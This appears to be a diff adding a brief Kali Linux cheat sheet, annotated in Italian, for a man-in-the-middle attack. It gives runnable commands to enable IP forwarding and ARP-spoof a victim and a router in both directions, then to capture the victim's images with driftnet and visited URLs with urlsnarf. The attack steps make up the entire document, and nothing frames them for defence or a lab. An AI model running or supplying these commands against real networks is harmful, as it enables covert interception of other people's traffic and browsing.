@@ -1,0 +1,21 @@
+Man in the Middle - Kali
+
+Programs:
+
+- Arpspoof
+- Driftnet
+- Urlsnarf
+
+Guide:
+
++ echo 1 > /proc/sys/net/ipv4/ip_forward				=>	Modifica da 0 a 1 per attivare port forwarding
+
++ arpspoof -i [Interface] -t [IPAddrRemote] [IPAddrRouter]		=>	Set arpspoof tra remoto e router
+
++ arpspoof -i [Interface] -t [IPAddrRouter] [IPAddrRemote]		=>	Set arpspoof tra router e remoto
+
+Tutti i pacchetti passano attraverso la macchina locale.
+
++ driftnet -i [Interface]										=>	Avvia driftnet per catturare traffico immagini
+
++ urlsnarf -i [Interface]										=>	Avvia urlsnarf per catturare gli URL visitati
